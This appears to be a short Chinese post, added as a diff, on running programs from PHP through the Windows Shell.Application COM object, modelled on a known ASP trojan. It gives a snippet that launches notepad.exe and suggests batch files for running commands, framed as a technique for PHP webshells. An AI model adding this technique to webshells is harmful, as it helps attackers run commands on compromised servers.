@@ -1,0 +1,11 @@
+关于用Shell.Application来执行程序，在海阳顶端asp木马里已有示例。用的是ShellExecute 这个方法。
+
+今天试了一下，用open也可以。php代码如下，我好像还没有在php的webshell中看到相关方法
+
+<?php
+$wsh = new COM('Shell.Application') or die("Shell.Application");
+    $exec = $wsh->open("c:\\windows\\system32\\notepad.exe");
+    //没有回显，多了个notepad进程，可以写一个批处理来运行dos命令。open换用ShellExecute 也可。
+?>
+
+xp+APMServ5.2.0测试通过。
